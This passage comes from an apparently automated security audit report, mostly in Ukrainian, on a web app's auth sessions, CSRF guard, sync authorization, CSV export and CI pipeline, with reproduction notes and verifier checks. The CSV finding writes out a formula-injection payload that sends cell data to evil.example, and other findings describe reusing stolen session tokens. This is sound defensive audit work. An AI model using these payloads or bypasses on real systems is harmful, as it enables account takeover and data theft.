відкликання давав той самий доступ, вікно лише продовжує його на ≤5 хв. Тому це defense-in-depth, а не обхід.
```

**Додаткові докази верифікатора:**

```text
revoke.mjs, одразу після sign-out: GET /api/me 200 | GET /api/auth/get-session 200 (повертає сесію з кешу) | GET /api/me/export 401 | GET /api/auth/list-sessions 200 | GET /api/v2/sync/pull 200 | GET /api/coach/memory 200 | POST /api/coach/memory 200. Далі /api/me = 200 до t+271s і 401 на t+301s. chemail.mjs (audit_pool136): після sign-out stale cookie дає POST /api/auth/update-user {name:'stolen'} → 200, і в DB name = 'stolen' (запис уже ПІСЛЯ відкликання). При цьому POST /api/auth/change-email → 401 і POST /api/auth/revoke-other-sessions → 401. Код: apps/server/src/auth.ts:424-431 (cookieCache 300s), :714-726, :809; apps/server/src/http/requireSession.ts:83-116; apps/server/src/modules/sync/syncV2.ts:635-670 (pull по since без DB-перевірки сесії); node_modules/better-auth/dist/api/routes/session.mjs:328 (sensitiveSessionMiddleware), update-user.mjs:83/217/381.
```

### [low] Зміна email без підтвердження для акаунтів із непідтвердженою адресою (навмисна конфігурація, live не перевірено)

- **ID:** `api-live/auth-flows-live#2` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Серйозність від шукача:** info (переоцінено верифікатором)
- **Де:** apps/server/src/auth.ts:331-342 (user.changeEmail.updateEmailWithoutVerification: true), apps/server/src/auth.ts:368 (requireEmailVerification: env.REQUIRE_EMAIL_VERIFICATION, дефолт false)
- **Вплив:** Поки REQUIRE_EMAIL_VERIFICATION вимкнено, непідтверджений акаунт може миттєво переприв'язати адресу. Задокументовано як навмисне; ризик обмежений тим, що власність над старою адресою не була доведена.
- **Що зробити:** Підтвердити поведінку live і переконатися, що всі чутливі інтеграції гейтяться requireVerifiedEmail() незалежно від глобального прапорця.

**Докази:**

```text
changeEmail: { enabled: true, updateEmailWithoutVerification: true, ... }  // коментар: 'Поточний email НЕ підтверджений → updateEmailWithoutVerification дозволяє оновити адресу одразу'
```

**Відтворення:**

```text
Не відтворено live у цьому раунді. Follow-up: на throwaway-акаунті з emailVerified=false викликати POST /api/auth/change-email і перевірити, що email змінюється одразу.
```

**Верифікатор:**

```text
Відтворив live (agents/verify-api-live-auth-flows-live/chemail.mjs, пул-юзер audit_pool136 з emailVerified=false): POST /api/auth/change-email {newEmail} → 200 {status:true}. У DB старої адреси більше немає, нова адреса записана одразу, emailVerified=f. Це гілка canUpdateWithoutVerification у better-auth 1.6.23 (update-user.mjs:375-440), і її свідомо увімкнено: коментар apps/server/src/auth.ts:310-342 каже, що для непідтвердженої адреси підтвердження старого ящика не має сенсу. Що знахідку обмежує: endpoint вимагає авторитетну DB-сесію (sensitiveSessionMiddleware; stale cookie-cache після sign-out дає 401), не розкриває існування адрес (на зайняту адресу повертає status:true без змін), а emailVerified лишається false. Тому requireVerifiedEmail() на /api/mono/connect і далі блокує. Підняв з info до low, бо раціональ у коментарі відповідає на питання «чи доведено власність старого ящика», а не на загрозу «вкрадена сесія»: requireEmailVerification=false і верифікацію часто не проходять, тому багато непідтверджених адрес насправді належать легітимним власникам. З валідною вкраденою сесією атакувальник може тихо (старій адресі не приходить жодного листа) переприв'язати email. Далі він скидає пароль на свою адресу: requestPasswordReset у password.mjs не перевіряє emailVerified, а revokeSessionsOnPasswordReset виганяє власника. Так тимчасовий доступ стає постійним захопленням акаунта. Це все одно вимагає попередньої компрометації сесії, тому low (defense-in-depth), а не вище. Ланцюжок reset до кінця live не проганяв (ліміти й немає пошти), сама зміна email відтворена.
```

**Додаткові докази верифікатора:**

```text
chemail.mjs: 'db before: audit_pool136@example.com|f' → 'change-email 200 {"status":true}' → 'db after old: 0 new: verify_chemail_1790904869737@example.com|f'. grep 'emailVerified|requireEmailVerification' у node_modules/better-auth/dist/api/routes/password.mjs дає 0 збігів (reset не залежить від верифікації). requireVerifiedEmail() застосовано лише в apps/server/src/routes/mono-webhook.ts:91; /api/privat/connect (routes/banks.ts:43-51) має лише requireFreshSession, але там креденшели мерчанта, а не squat-вектор. Локально всі 198 юзерів мають emailVerified=f, бо пошти немає, тож це оточення, а не прод. У docs/work/specs/audits/** і docs/open-work.md updateEmailWithoutVerification і change-email не згадуються (лише docs/work/specs/launch/email-verification-sweep.md:47 фіксує, що changeEmail увімкнено 2026-08-02).
```

### [low] GET /api/auth/list-sessions віддає RAW session token, який є робочим Bearer-кредом (обхід httpOnly cookie через плагін bearer())

- **ID:** `api-live/gap-better-auth-catchall-subroutes#3` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** better-auth/dist/api/routes/session.mjs:371-397 (listSessions -&gt; parseSessionOutput з полем token); apps/server/src/auth.ts:617 (plugins: [bearer(), expo()])
- **Вплив:** httpOnly cookie існує саме щоб JS не читав credential, але list-sessions віддає сире значення токена клієнтові, а плагін bearer() робить його портативним довговічним credential-ом. Будь-який XSS/компрометація клієнта, прочитавши list-sessions, отримує повноцінний токен для персистентного захоплення акаунта поза браузером жертви — ескалація XSS до стійкого ATO. (Upstream-дефолт Better Auth; у парі з bearer() ризик вищий, ніж у cookie-only.)
- **Що зробити:** Не віддавати сире token у list-sessions на клієнт: віддавати лише непрозорий session id, а ревокацію виконувати за id. Переглянути необхідність bearer() на веб-поверхні (мобільний контур на паузі, ADR-0094).

**Докази:**

```text
GET /api/auth/list-sessions (as u1, свіжа сесія) -> 200, перший елемент має поля [expiresAt, token, createdAt, updatedAt, ipAddress, userAgent, userId, id], tokenExposed=true (напр. KER22c38...). Цей token як Authorization: Bearer <token> БЕЗ cookie: GET /api/auth/get-session -> 200 hasUser=true userEmail=audit_pool169@example.com; GET /api/me -> 200 {"user":{"id":"WnB42WNEjksmNWLiGzVYJjd5KkHgBgeA","email":"audit_pool169@example.com"...}}.
```

**Відтворення:**

```text
node <scratch>/agents/api-live-gap-better-auth-catchall-subroutes/04-bearer-overmatch-social.mjs (перші 3 рядки output).
```

**Верифікатор:**

```text
Reproduced with a fresh user of my own. `GET /api/auth/list-sessions` returned 200 with keys [expiresAt, token, createdAt, updatedAt, ipAddress, userAgent, userId, id]. The 32-char token is the unsigned prefix of the httpOnly `better-auth.session_token` cookie (the cookie value starts with it). Sent as `Authorization: Bearer <token>` with no cookie and no Origin, it returned 200 on `/api/auth/get-session` (user email) and on `/api/me`. The same raw token used as an unsigned cookie does NOT authenticate (hasUser=false). So the `bearer()` plugin (auth.ts:617) is exactly what turns a JS-readable value into a portable credential. I downgraded severity because it needs an XSS or another way to read responses from the origin first. Such an attacker can already act inside the session, so the extra gain is persistence outside the victim's browser (7-day rolling TTL), which password change or session revoke ends. This is also the upstream Better Auth default. The web UI relies on it: apps/web/src/core/profile/SessionsSection.tsx:175-181 calls `revokeSession({ token })` because upstream revoke-session takes a token, so dropping the token would need a server-side revoke-by-id wrapper. bearer() is needed for the Capacitor shell (authClient.ts:18-56). The cross-origin chain that made this exploitable without XSS (CORS localhost defaults) has since been NODE_ENV-gated (cors.ts DEV_ORIGINS comment). The mechanism itself is already recorded in a prior audit.
```

**Додаткові докази верифікатора:**

```text
Verifier script <scratch>/agents/verify-api-live-gap-better-auth-catchall-subroutes/v3-bearer.mjs. Output: list-sessions 200, tokenLen 32, cookieStartsWithToken=true, bearerGetSession 200 with the email, bearerMe 200, rawTokenAsCookie 200 with hasUser=false (cookie must be signed). Prior audit docs/work/specs/audits/security-comprehensive-2026-08-04.md:109-110 describes the same chain: '`GET /api/auth/list-sessions` → сирі session-токени → 7-денний bearer-доступ ... поза браузером жертви'. Its fix (prod-gating of localhost CORS) is in apps/server/src/http/cors.ts; the token exposure itself is untouched.
```

### [low] Дочірні sync-рядки можна прив'язати до чужого батьківського рядка (FK без перевірки власника), що дає оракул існування id між тенантами

- **ID:** `api-live/idor-cross-user#2` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Живе API
- **Стан:** відкрито
- **Де:** apps/server/src/modules/sync/fizruk/applySync.ts:196-200, 250-275 (workout_id не звіряється з власником), :364-367, 397-412 (workout_item_id); FK fizruk_workout_items.workout_id → fizruk_workouts(id) ON DELETE CASCADE, fizruk_workout_sets.workout_item_id → fizruk_workout_items(id) ON DELETE CASCADE; guardUuidPkApply (applySync-helpers.ts:66-68) повертає різні reason для чужого і для вільного id
- **Вплив:** Даних A не видно і не змінено: pull, export і reminders фільтрують за user_id, це перевірено. Проте 1) B може перевірити, чи існує будь-який id тренування або вправи в будь-якого користувача (applied чи apply_failed, fk_violation чи applied); 2) у базі з'являються рядки, де child.user_id ≠ parent.user_id, тож будь-який майбутній join items→workouts за workout_id без user_id змішає тенантів; 3) коли A стирає акаунт (GDPR hard-delete), каскад мовчки видаляє рядки B. Id переважно UUID, тому практична цінність оракула низька.
- **Що зробити:** У applyFizrukItems і applyFizrukSets перевіряти, що батьківський рядок належить userId (SELECT 1 FROM fizruk_workouts WHERE id=$1 AND user_id=$2), або перейти на композитні FK (user_id, workout_id) → fizruk_workouts(user_id, id). Для чужого і неіснуючого id повертати однаковий reason.

**Докази:**

```text
51-out.txt: A володіє w_xmuq4dh1g / wi_xmuq4dh1g.
B push fizruk_workout_items {id:'wiB_muq4rziz', user_id:B, workout_id:'w_xmuq4dh1g'} → [{"status":"applied"}]
B push fizruk_workout_sets {workout_item_id:'wi_xmuq4dh1g'} → applied
B push item з workout_id неіснуючого id → rejected:apply_failed
psql: item|JNLz…(B)|w_xmuq4dh1g ; set|JNLz…(B)|wi_xmuq4dh1g
Оракул і по прямому PK (20-out.txt та 41-out.txt): insert чужого id → rejected:fk_violation, вільного → applied, delete вільного → rejected:not_found.
```

**Відтворення:**

```text
node <scratch>/agents/api-live-idor-cross-user/51-parent-ref.mjs (після 20-matrix.mjs, де A створює батьківські рядки).
```

**Верифікатор:**

```text
applyFizrukItems (fizruk/applySync.ts:196-275) checks that workout_id is present but does not check who owns the parent row. applyFizrukSets (:363-412) has the same gap for workout_item_id. The DB-level FKs are fizruk_workout_items.workout_id → fizruk_workouts(id) and fizruk_workout_sets.workout_item_id → fizruk_workout_items(id). They are global and have no user_id component, so B's child row is accepted while pointing at A's parent. I reproduced this live.

The impact is limited, as the finder says. I found no server query that joins items to workouts or sets to items; the only references are in apply code and the export. Pull and export are scoped by user_id, and A's export did not contain B's injected rows. Workout and item ids are prefix_UUID (useWorkouts.ts:31-35, activeWorkoutLib.ts:8-10), so the existence oracle only works if you already know the id. The cascade on A's hard delete only removes B's own deliberately mis-linked rows. Low severity, defense-in-depth, is right.
```

**Додаткові докази верифікатора:**

```text
repro1.mjs, output in v2-parent-out.txt. A creates workout 7f2421f8…. B pushes an item with workout_id = A's workout and gets applied. psql shows item_owner = n9IP… (B) and workout_owner = b321… (A). B pushes a set onto A's item f92823f9… and gets applied; psql shows set_owner B, item_owner A. A's /api/me/export does not contain B's item or set ids. Live constraints: fizruk_workout_items_workout_id_fkey FOREIGN KEY (workout_id) REFERENCES fizruk_workouts(id) ON DELETE CASCADE, and the equivalent FK on sets.
```

### [low] Заголовок X-Api-Secret (будь-яке значення) обходить CSRF-гард на session-роутах, де немає downstream requireApiSecret

- **ID:** `api-live/input-fuzz#8` · **Вердикт:** підтверджено · **Категорія:** `csrf` · **Лейн:** Живе API
- **Стан:** відкрито
- **Де:** apps/server/src/http/requireCsrfHeader.ts (блок if (req.headers['x-api-secret']) { next(); } — без перевірки, що маршрут реально має requireApiSecret далі)
- **Вплив:** CSRF-exemption ширший за потрібне: вимикає X-Requested-With-гард на cookie-session-роутах без секрет-перевірки. Браузерної експлуатації немає (X-Api-Secret не в CORS allow-headers -&gt; preflight для evil-origin падає), тож це ерозія defense-in-depth, а не прямий обхід. Ризик зростає, якщо X-Api-Secret колись потрапить у ALLOW_HEADERS.
- **Що зробити:** Звузити exemption: пропускати по X-Api-Secret лише на маршрутах, які справді мають requireApiSecret (явний allowlist /api/push/send, /api/internal), а не глобально.

**Докази:**

```text
PATCH /api/me/preferences з x-api-secret:x, БЕЗ X-Requested-With -> 200 (запис проходить); без заголовка -> 403 CSRF_HEADER_REQUIRED. Так само PUT /api/me/profile -> 200, POST /api/coach/memory -> 200, DELETE /api/ai-memory -> 200, POST /api/privat/disconnect -> 200. Ці маршрути НЕ мають downstream requireApiSecret. Але X-Api-Secret відсутній у ALLOW_HEADERS apiCors, тож для evil-origin браузерний preflight цього заголовка не проходить — з браузера cross-origin не експлуатується.
```

**Відтворення:**

```text
node .../agents/api-live-input-fuzz/r1_csrf.mjs (стовпець X-Api-Secret:anything = 200 на me/preferences, me/profile, coach/memory, ai-memory, privat/disconnect).
```

**Верифікатор:**

```text
Підтверджено в коді й наживо. requireCsrfHeader.ts:146 пропускає далі будь-який state-changing запит, якщо заголовок x-api-secret непорожній, з будь-яким значенням. Коментар у рядках 143-145 припускає, що далі по ланцюжку стоїть requireApiSecret(...) і він відсіє невалідний секрет. Насправді requireApiSecret змонтовано лише на /api/push/send (routes/push.ts:125), на інших роутах його немає. Перевірка на свіжому throwaway-юзері (vif3-main): без X-Requested-With усі нижче дають 403 CSRF_HEADER_REQUIRED, а з x-api-secret:x проходять. PATCH /api/me/preferences 200, PUT /api/me/profile 200, POST /api/coach/memory 200, DELETE /api/ai-memory 200, POST /api/privat/disconnect 200, POST /api/finyk/manual-expenses 201. /api/push/send дає 503 NOT_CONFIGURED, тобто там guard справді стоїть. Чому не вище за low: з браузера це не експлуатується. X-Api-Secret немає в ALLOW_HEADERS глобального apiCorsMiddleware (apiCors.ts:31, це навмисне рішення з коментарем). Тому preflight не пропускає цей заголовок навіть з дозволеного origin, а для чужого origin не віддає ACAO. HTML-форма чи simple-запит custom-заголовок поставити не можуть. Не-браузерному клієнту CSRF-захист і не потрібен. Отже це ерозія defense-in-depth і хибне припущення в коментарі, а не прямий обхід.
```

**Додаткові докази верифікатора:**

```text
Скрипти: r3/v8_csrf.mjs (матриця noXRW=403 / x-api-secret=200|201) і r3/v8b_browser.mjs у <scratch>/agents/verify-api-live-input-fuzz/. Браузерна перевірка: зі сторінки http://127.0.0.1:4173 (дозволений origin, залогінений юзер) fetch PATCH /api/me/preferences з x-api-secret дає 'Failed to fetch', бо preflight відхилено; той самий запит з X-Requested-With дає 200. Зі сторінки about:blank (origin null) теж 'Failed to fetch'. Preflight OPTIONS повертає ACAH 'Content-Type, Authorization, X-Requested-With, X-Origin-Device-Id, traceparent, tracestate, X-Token, X-Privat-Id, X-Privat-Token', без X-Api-Secret. Окремо знайшов латентну пастку, що підсилює рекомендацію звузити exemption: apps/server/src/http/cors.ts:47-55 DEFAULT_ALLOW_HEADERS містить 'X-Api-Secret'. Сьогодні setCorsHeaders викликає лише apiCors і передає явний allowHeaders. Але app.ts:149-150 прямо пропонує handler-ам 'ре-сетити' CORS-заголовки, і будь-який майбутній виклик setCorsHeaders без allowHeaders пропустить X-Api-Secret у preflight. Тоді цей bypass стане справжнім браузерним CSRF для дозволених origin. Сервер не перевіряє Origin: node-запит з origin evil.example і x-api-secret теж отримує 200, але без ACAO.
```

### [low] Публічні проксі /api/barcode і /api/food-search дають анонімам вичерпати спільну зовнішню квоту власника (per-IP добовий ліміт вищий за project-wide стелю апстріму)

- **ID:** `api-live/unauth-sweep#1` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Живе API
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md §1.3 «Неавтентифіковані платні ендпоінти» (SECURITY-20260804-1-3, open; анонімний /api/barcode спалює 100/добу UPCitemdb); також product-knowledge-nutrition.md E7 і 2026-08-05-external-critique-surface.md §2.4 (тріал UPCitemdb як блокер запуску)
- **Де:** apps/server/src/routes/barcode.ts:17-33; apps/server/src/routes/food-search.ts:16-33; каскад modules/nutrition/barcode.ts:327-395,491-509
- **Вплив:** Неавтентифікований клієнт може вичерпати спільну, оплачувану власником зовнішню квоту (UPCitemdb trial 100/добу на весь проєкт, USDA-ключ) з однієї-кількох IP, бо per-IP добовий ліміт (300/600) заданий ВИЩЕ за project-wide стелю апстріму. Наслідок — відмова фіч 'скан штрихкоду' і 'пошук їжі' для всіх користувачів до кінця доби плюс можлива вартість. Лімітер, який за коментарем мав це зупиняти, мети не виконує навіть проти однієї IP.
- **Що зробити:** Знизити добовий per-IP ліміт нижче за project-wide стелю апстріму, або додати окремий ГЛОБАЛЬНИЙ (не per-IP) добовий бакет на ключ апстріму, щоб сукупний анонімний трафік не міг перевищити квоту постачальника; агресивніше кешувати miss-сентинелі.

**Докази:**

```text
Обидва роути без requireSession(). barcode.ts: rateLimitExpress({key:'api:barcode',limit:30,windowMs:60000}) + {key:'api:barcode:daily',limit:300,windowMs:24h}. Коментар там же: 'UPCitemdb на trial-плані — 100 запитів/добу на весь проєкт ... Другий бакет із добовим вікном обмежує саме це'. Але добовий бакет=300/IP, project-wide стеля=100/добу на весь проєкт -> 300>100, тобто навіть ОДНА анонімна IP перевищує спільну квоту втричі. food-search: {key:'api:food-search:daily',limit:600,windowMs:24h} при USDA-ключі власника. Жива перевірка: GET /api/food-search?q=zzzznotreal -> 200 {"products":[]} анонімно; GET /api/barcode?code=0 -> 400 (валідація) — роут доступний без сесії. Бакети per-IP (getIp->req.ip).
```

**Відтворення:**

```text
node <scratch>/agents/api-live-unauth-sweep/01-sweep.mjs і final.mjs. Код лімітів barcode.ts:17-33, food-search.ts:16-33; каскад OFF->USDA->UPCitemdb modules/nutrition/barcode.ts:491-509. Exploit: анонімно ~300 унікальних неіснуючих штрихкодів/добу з однієї IP -> вичерпати project-wide 100/добу UPCitemdb trial -> скан штрихкодів ламається для всіх. Не доганяв до реального вичерпання (деструктивно + немає прод-ключів).
```

**Верифікатор:**

```text
Підтверджено в коді й наживо. routes/barcode.ts:17-33 монтує /api/barcode без requireSession() і з двома per-IP бакетами: 30 за хвилину та 300 за добу. Коментар у тому ж файлі каже, що добовий бакет захищає квоту UPCitemdb, але в AI-DANGER у modules/nutrition/barcode.ts:327-336 ця квота 100 запитів на добу на весь проєкт, тож 300 > 100. Анонімний запит наживо отримав 200 з `RateLimit-Limit: 300`, тобто активний саме добовий бакет. Каскад (barcode.ts:454-509) іде послідовно: каталог, потім OFF, потім USDA, потім UPCitemdb. Кеш промахів живе 30 хв і ключується штрихкодом, тому кожен НОВИЙ валідний 8–14-значний код проходить усі джерела, і одна IP може спалити тріал UPCitemdb приблизно за 100 запитів.

Серйозність знижено з medium до low:
(1) UPCitemdb лише третій резервний рівень. Після вичерпання він віддає 429, а isTransientHttpStatus(429) (barcode.ts:167-169) переводить відповідь у 503 «Бази продуктів зараз не відповідають» тільки для кодів, яких немає в каталозі, OFF і USDA. Твердження, що скан ламається для всіх, перебільшене.
(2) Тріал безкоштовний, тож витрат немає. Ключ USDA з api.data.gov теж безкоштовний, а його ліміт близько 1000 на годину на ключ, що вище за 600 на добу з однієї IP.
(3) AI-DANGER-коментар уже визнає, що десяток легітимних користувачів вичерпує тріал за першу ж добу. Отже, квоту не захистить жоден per-IP ліміт, і вада тут у самому тріалі. Висновок про невідповідність ліміту коментарю правильний, а рекомендація ввести глобальний бакет розумна.
```

**Додаткові докази верифікатора:**

```text
Перевірка: <scratch>/agents/verify-api-live-unauth-sweep/01-verify.mjs.
- GET /api/barcode?barcode=00000000 анонімно повернув 200, `ratelimit-limit: 300`, `remaining: 299`, `cache-control: public, max-age=300` (апстріми досяжні, повернувся продукт із USDA).
- GET /api/food-search анонімно повернув 200, `ratelimit-limit: 600`.
- Примітка: параметр роуту називається `barcode`, а не `code`. 400 у знахідці виник через валідацію, а не через auth.
- Після 429 від UPCitemdb промах не кешується (barcode.ts:534-544), тож кожен наступний запит з тим самим кодом знову б'є в UPCitemdb.
```

### [low] CSV-експорт операцій вразливий до formula injection (=, +, -, @ на початку опису)

- **ID:** `browser-surfaces/finyk-flows#5` · **Вердикт:** підтверджено · **Категорія:** `injection` · **Лейн:** Браузер · поверхні
- **Стан:** відкрито
- **Де:** /finyk/transactions -&gt; «Вивантажити операції у CSV»; apps/web/src/shared/lib/ui/export.ts:24-30 (escapeCSV лише бере в лапки); apps/web/src/modules/finyk/pages/transactions/exportTransactionsCsv.ts:110-149
- **Вплив:** Описи з виписок і банку частково контролюють треті особи (наприклад, коментарі до переказів). У табличному редакторі такі описи виконуються як формули: фішинг-посилання, витік сусідніх комірок.
- **Що зробити:** В escapeCSV додавати апостроф до значень, що починаються з = + - @ TAB CR (OWASP CSV Injection), і брати їх у лапки.

**Докази:**

```text
r3-20-csvinj.mjs, файл agents/browser-surfaces-finyk-flows/r3-csvinj.csv містить рядки '2026-10-02,05:03,@SUM(1+1),-1.00,витрата,Транспорт', '-3+4', '+1+2' і '=HYPERLINK(...evil.example...)'. Комірки починаються з формульних символів без префікса.
```

**Відтворення:**

```text
Додати витрату з назвою =HYPERLINK("https://evil.example/?x="&A1,"Деталі") (або імпортувати виписку з таким описом), натиснути «Вивантажити операції у CSV», відкрити файл в Excel/Google Sheets.
```

**Верифікатор:**

```text
The escapeCSV helper in apps/web/src/shared/lib/ui/export.ts:24-30 only wraps a value in quotes when it contains the separator, a quote or a newline. It never neutralises a leading =, +, -, @, TAB or CR. exportTransactionsCsv.ts:110-120 passes tx.description through unchanged. Descriptions can come from bank or imported-statement data that third parties partly control.

Low is right: this is a defense-in-depth issue. Exploiting it requires the user to open the export in a spreadsheet, and spreadsheets warn on DDE (HYPERLINK-style payloads still render as live links). One caution for the fix: the 'Сума' column is legitimately negative ('-1.00'), so a blanket prefix would break numbers. The fix should target text columns only.
```

**Додаткові докази верифікатора:**

```text
The finder's export agents/browser-surfaces-finyk-flows/r3-csvinj.csv contains unprefixed cells: '=1+1', '@SUM(1+1)', '-3+4', '+1+2' and '"=HYPERLINK(""https://evil.example/?x=""&A1,""Деталі"")"'. Reading the code confirms there is no sanitisation step anywhere in arrayToCSV or exportToCSV. Nothing about CSV/formula injection is tracked in docs/.
```

### [low] Реєстрація розкриває існування акаунта, хоча вхід і «Забули пароль» від enumeration захищені

- **ID:** `browser-surfaces/public-auth-pages#11` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Браузер · поверхні
- **Стан:** відкрито
- **Де:** POST /api/auth/sign-up/email; apps/web/src/core/auth/RegisterForm.tsx (messages.auth.userAlreadyExists)
- **Вплив:** Можна перевірити, чи email зареєстровано в застосунку з фінансовими та health-даними. Ліміт 5 запитів/хв на IP це гальмує, але не прибирає.
- **Що зробити:** Свідомо зафіксувати компроміс або перейти на нейтральну відповідь («Якщо акаунта ще немає, ми його створили; перевір пошту»), за потреби з email-верифікацією перед входом.

**Докази:**

```text
29-signup-existing.mjs: `422 POST /api/auth/sign-up/email => {"message":"User already exists. Use another email.","code":"USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL"}`, UI: «Цей email вже зареєстровано. Спробуй увійти.» Для порівняння: невірний пароль і неіснуючий email на вході дають однакове «Неправильний email або пароль.» (07-signin-errors.mjs), forgot-password теж нейтральний.
```

**Відтворення:**

```text
На /sign-in → «Немає акаунту? Зареєструватися», введи email наявного користувача.
```

**Верифікатор:**

```text
Відтворено одним запитом: POST /api/auth/sign-up/email з audit_a@example.com → 422 `USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL`. Клієнт це свідомо мапить (AuthContext.tsx:182-184, 525-526) у «Цей email вже зареєстровано». Водночас sign-in і request-password-reset навмисно нейтральні (AuthContext.tsx:752, useForgotPassword.ts:27, коментар у waitlist.ts:40-41 про auth-роути). Розбіжність захисту від enumeration реальна. `requireEmailVerification` за замовчуванням false (auth.ts:368), тож нейтральної відповіді на sign-up немає. Знахідку пом'якшують ліміт 5/хв/IP і 10/15хв на email, а також те, що так поводяться більшість застосунків. Попередній аудит (2026-08-05-browser-profile-testing.md:376-380) вніс це повідомлення в список «чистих» як UX, а не як ризик. Відстеженим питанням це не є.
```

**Додаткові докази верифікатора:**

```text
v3-signup-existing.mjs: `422 {"message":"User already exists. Use another email.","code":"USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL"}`.
```

### [low] CI без найменших привілеїв: джоба check на PR має невикористаний pull-requests: write і токен у .git/config, TURBO_TOKEN доступний усім PR-джобам

- **ID:** `client-static/infra-headers-ci-deps#10` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** .github/workflows/ci.yml:57-60 (TURBO_TOKEN у workflow env), 88-96 (check: pull-requests: write, checkout без persist-credentials:false), 1350 (secrets: inherit для deploy-api); turbo.json (немає signature)
- **Вплив:** Скомпрометована dev-залежність у same-repo PR (зокрема в автомерджі Renovate) отримує токен із правом писати в PR і може записати в спільний turbo-кеш артефакти для хешів, які потім реплеїть check на main. Через це «зелений» гейт деплою може не виконати тести насправді.
- **Що зробити:** У check: `permissions: contents: read` і `persist-credentials: false`. TURBO_TOKEN передавати лише в push-to-main прогонах (або дати PR-джобам read-only токен і `--remote-cache-read-only`). У deploy-api замість `secrets: inherit` явно передати COOLIFY_URL і COOLIFY_TOKEN.

**Докази:**

```text
`check` біжить на кожному pull_request, виконує `pnpm install` і всі тести (сторонній код) з `permissions: pull-requests: write`, хоча жоден крок цієї джоби токен не використовує. actions/checkout за замовчуванням зберігає GITHUB_TOKEN у git config. У джобі bundle-budgets репо вже визнає саме цей ризик: «скомпрометована залежність або білд-скрипт дістали б креденшел із правом писати в PR ... persist-credentials: false». `TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}` на рівні workflow доступний кожній джобі, включно з same-repo PR (Renovate, гілки агентів). Remote cache без `TURBO_REMOTE_CACHE_SIGNATURE_KEY` і без read-only токена для PR. `deploy-api` отримує `secrets: inherit` (усі секрети репо), хоча потрібні лише COOLIFY_URL/COOLIFY_TOKEN.
```

**Відтворення:**

```text
Прочитати ci.yml:57-60, 88-110, 396-412, 1338-1350.
```

**Верифікатор:**

```text
Partly confirmed. The main impact chain is not live today. Confirmed: the `check` job (ci.yml:88-91) declares `pull-requests: write`, and none of its steps (lines 88-342) uses a token: no github-script, no gh, no github-token. It runs `pnpm install` and the full test suite on every pull_request. The live CI log for run 36950968697, job check, shows `GITHUB_TOKEN Permissions: Contents: read, PullRequests: write` and checkout with `persist-credentials: true` (extraheader written to a git-credentials config). The bundle-budgets comment (ci.yml:398-399) says the permission 'лишається для інших кроків' in check, but no such step exists. Not live: the turbo remote-cache poisoning chain. The same log shows `TURBO_TOKEN: ` (empty, not ***) in all 25 step envs and turbo prints `• Remote caching disabled`, so no PR job can write to a shared cache today. That is a latent risk only, if TURBO_TOKEN is ever configured. `secrets: inherit` on deploy-api is negligible: deploy-api.yml references only COOLIFY_URL and COOLIFY_TOKEN, runs only on push to main with environment production, and unreferenced inherited secrets are never materialised into step env. Same-repo PRs only: fork PRs get a read-only token and no secrets. What remains is an unused write permission plus a persisted token in a job that runs dependency code. That is low-severity defense-in-depth, and the TURBO_TOKEN workflow-level scope and persist-credentials default were already raised in the 2026-08-04 security audit §1.0.
```

**Додаткові докази верифікатора:**

```text
gh run view --job 110663609839 --log (saved to checklog.txt): `GITHUB_TOKEN Permissions ... PullRequests: write`, `persist-credentials: true`, `git config --file .../git-credentials-*.config http.https://github.com/.extraheader AUTHORIZATION: basic ***`, `TURBO_TOKEN: ` (empty, 25 occurrences), `• Remote caching disabled` (3x). turbo.json has no remoteCache/signature section.
```

### [low] Плаваючі теги й непіновані інструменти в прод-ланцюгу збірки

- **ID:** `client-static/infra-headers-ci-deps#11` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** Dockerfile.api:83,150 (node:22.16.0-alpine без digest), 213 (gcr.io/distroless/nodejs22-debian13:nonroot), 224,237 (busybox:stable-musl); apps/web/vercel.json і apps/landing/vercel.json ignoreCommand (`npx --yes turbo@2`); .github/workflows/deploy-landing.yml:89 (`pnpm add -g vercel@59`); .github/workflows/posthog-release-annotation.yml:42,47 (actions/checkout@v4, setup-node@v4); renovate.json (pinDigests лише для pgvector)
- **Вплив:** Підміна або зламаний реліз upstream-тегу (busybox, distroless, turbo@2, vercel@59) тихо потрапляє в прод-образ або у Vercel-збірку з доступом до прод-env, а відтворити попередню збірку неможливо.
- **Що зробити:** Піннути FROM та `COPY --from` за @sha256 і ввімкнути Renovate `pinDigests` для dockerfile-менеджера. Зафіксувати точну версію turbo в ignoreCommand (або брати з lockfile через `pnpm exec turbo`), vercel CLI піннути точно. SHA-піннути actions у posthog-release-annotation.yml.

**Докази:**

```text
`COPY --from=busybox:stable-musl /bin/busybox /bin/sh`: цей бінарник стає shell, що виконує ENTRYPOINT (міграції на живій БД і сервер). Runtime-образ distroless теж на плаваючому тезі. Образ збирається на прод-сервері Coolify, а Trivy (container-scan.yml) біжить лише щотижня і не гейтить деплой. posthog-release-annotation.yml: єдині в репо action-и без SHA-піна, а job має secrets.POSTHOG_PERSONAL_API_KEY. Частково відоме як SECURITY-20260804-RUNTIME (open).
```

**Відтворення:**

```text
grep -n "FROM\|--from=busybox" Dockerfile.api; grep -rn "uses:" .github/workflows | grep -v '@[0-9a-f]\{40\}' | grep -v 'uses: ./'
```

**Верифікатор:**

```text
